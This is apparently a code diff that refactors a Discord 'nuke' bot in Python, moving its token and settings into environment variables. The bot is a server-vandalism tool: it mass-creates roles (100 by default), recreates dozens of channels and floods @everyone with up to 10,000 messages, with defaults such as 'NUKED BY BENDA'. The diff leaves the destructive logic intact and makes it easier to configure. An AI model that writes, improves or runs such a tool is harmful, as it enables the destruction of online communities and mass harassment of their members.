@@ -1,31 +1,37 @@
 import asyncio
-import discord
-from discord.ext import commands
+import os
 import random
 import time
+from dotenv import load_dotenv
 
-# --- CONFIGURE THESE ---
-BOT_TOKEN = "TOKEN"
-PREFIX = "."
+import discord
+from discord.ext import commands
+
+# Load environment variables
+load_dotenv()
+
+# --- CONFIGURATION (from .env) ---
+BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("No token found. Make sure DISCORD_BOT_TOKEN is set in .env file")
+
+# Bot settings
+PREFIX = os.getenv("BOT_PREFIX", ".")
 
 # Nuke Configuration
-CHANNEL_NAME = "NUKED BY BENDA"
-MESSAGE = "@everyone NUKED BY BENDA"
-AMOUNT_OF_CHANNELS = 50
-AMOUNT_OF_MESSAGES = 10000
+CHANNEL_NAME = os.getenv("CHANNEL_NAME", "NUKED")
+MESSAGE = os.getenv("MESSAGE", "@everyone Server was nuked")
+AMOUNT_OF_CHANNELS = int(os.getenv("AMOUNT_OF_CHANNELS", "50"))
+AMOUNT_OF_MESSAGES = int(os.getenv("AMOUNT_OF_MESSAGES", "10000"))
 
-# Random channel name variations (optional - set to None to use CHANNEL_NAME)
-RANDOM_CHANNEL_NAMES = [
-    "BENDA", "NUKED"
-]
+# Optional: Random channel names
+RANDOM_CHANNEL_NAMES = os.getenv("RANDOM_CHANNEL_NAMES", "BENDA,NUKED").split(",")
+USE_RANDOM_NAMES = os.getenv("USE_RANDOM_NAMES", "False").lower() == "true"
 
-# Set to None to always use CHANNEL_NAME, or keep the list for random names
-USE_RANDOM_NAMES = False  # Set to False to use CHANNEL_NAME only
-
-# --- ROLE CONFIGURATION ---
-ENABLE_ROLES = True  # Set to False to disable role creation
-AMOUNT_OF_ROLES = 100  # How many roles to create
-ROLE_NAME = "NUKED BY BENDA"  # Name for the roles
+# Role configuration
+ENABLE_ROLES = os.getenv("ENABLE_ROLES", "True").lower() == "true"
+AMOUNT_OF_ROLES = int(os.getenv("AMOUNT_OF_ROLES", "100"))
+ROLE_NAME = os.getenv("ROLE_NAME", "NUKED")
 
 # -----------------------
 # DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
@@ -92,7 +98,7 @@ async def nuke_server(guild: discord.Guild):
         for i in range(AMOUNT_OF_ROLES):
             try:
                 await guild.create_role(name=f"{ROLE_NAME}")
-            except:
+            except Exception:
                 pass
 
     # Step 4: Create new channels
@@ -123,16 +129,12 @@ async def on_ready():
 
 @bot.command(name="nuke")
 async def nuke(ctx):
-    """Nuke the current server"""
-    # Check if user has administrator permission
+    """Nuke the current server (Administrator only)"""
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("You need Administrator permission to use this command!")
         return
 
-    # Confirm the nuke
-    await ctx.send("Nuking the server...")
-    
-    # Execute the nuke
+    await ctx.send("⚠️ **Nuking the server...** ⚠️")
     await nuke_server(ctx.guild)
 
 @bot.command(name="config")
